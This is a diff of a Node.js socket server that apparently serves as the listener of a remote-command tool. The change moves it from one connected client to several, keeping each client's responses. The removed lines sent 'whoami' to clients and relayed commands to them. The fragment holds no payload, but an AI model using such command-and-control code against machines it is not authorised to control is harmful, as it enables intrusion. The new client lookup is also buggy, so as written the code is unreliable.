@@ -21,25 +21,38 @@ server.listen({
    port,
 },() => {
     console.log(`Socket server listening at ${server.address().address}:${port}`);
+    console.log("-------------------------------");
 });
 
-server.on("connection", async (client) => {
-    console.log(`[+] Connection receieved: ${client.remoteAddress}:${client.address().port}`);
-    if (socketClients.indexOf(client)) {
-        socketClients.pop();
-    }
-    socketClients.push(client);
+server.on("connection", (client) => {
+    saveNewClient(client)
 
-    util.getClientCount(server);
-    client.write("whoami");
+    util.mainMenu();
 
     client.on("data", (data) =>  {
-        console.log(data.toString());
-        util.takeAndSendCommand(socketClients[0]);
+        try {
+            const currentClient = getClientConnection(client);
+            currentClient.responseHistory.push(data);
+        } catch {
+            console.error("Could not save response from client.")
+        }
     });
 });
 
-module.exports = server;
+const getClientConnection = (client) => {
+    try {
+        return socketClients.filter(socketClient => {
+            socketClient.address === `${client.remoteAddress}:${client.remotePort}`
+        });
+    } catch {
+        console.warn("Could not find client.");
+        return false;
+    }
+}
 
-// WE NEED TO ALLOW FOR MULTIPLE CONNECTIONS
-// THIS IS A POTENTIL FIX FOR THE 1 COMMAND ONLY PROBLEM
+const saveNewClient = (client) => {
+    console.log(`[+] Connection receieved: ${client.remoteAddress}:${client.remotePort}`);
+    socketClients.push({ address : `${client.remoteAddress}:${client.remotePort}`, client, responseHistory : [] });    
+}
+
+module.exports = server;
